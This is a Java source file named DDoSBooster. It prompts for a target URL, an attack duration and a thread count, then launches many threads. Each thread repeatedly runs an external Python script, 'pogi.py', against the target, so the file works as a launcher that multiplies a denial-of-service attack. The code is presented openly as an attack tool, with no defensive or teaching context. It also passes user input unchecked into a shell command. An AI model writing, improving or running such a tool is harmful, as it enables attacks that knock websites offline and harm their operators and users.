import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class DDoSBooster {
    private static final String PYTHON_SCRIPT = "python pogi.py";

    public static void main(String[] args) {
        try {
            // Input from user
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

            System.out.print("Enter the target URL (e.g., http://example.com): ");
            String targetUrl = reader.readLine();

            System.out.print("Enter attack duration in seconds: ");
            int duration = Integer.parseInt(reader.readLine());

            System.out.print("Enter number of threads: ");
            int numThreads = Integer.parseInt(reader.readLine());

            // Start the booster threads
            for (int i = 0; i < numThreads; i++) {
                new Thread(new ScriptRunner(targetUrl, duration, numThreads)).start();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static class ScriptRunner implements Runnable {
        private String targetUrl;
        private int duration;
        private int numThreads;

        public ScriptRunner(String targetUrl, int duration, int numThreads) {
            this.targetUrl = targetUrl;
            this.duration = duration;
            this.numThreads = numThreads;
        }

        @Override
        public void run() {
            try {
                long startTime = System.currentTimeMillis();
                long endTime = startTime + duration * 1000; // Convert duration to milliseconds

                while (System.currentTimeMillis() < endTime) {
                    Process process = Runtime.getRuntime().exec(PYTHON_SCRIPT + " " + targetUrl + " " + numThreads + " " + duration);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

                    String line;
                    while ((line = reader.readLine()) != null) {
                        System.out.println(line);
                    }

                    process.waitFor();
                }
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
        }
        
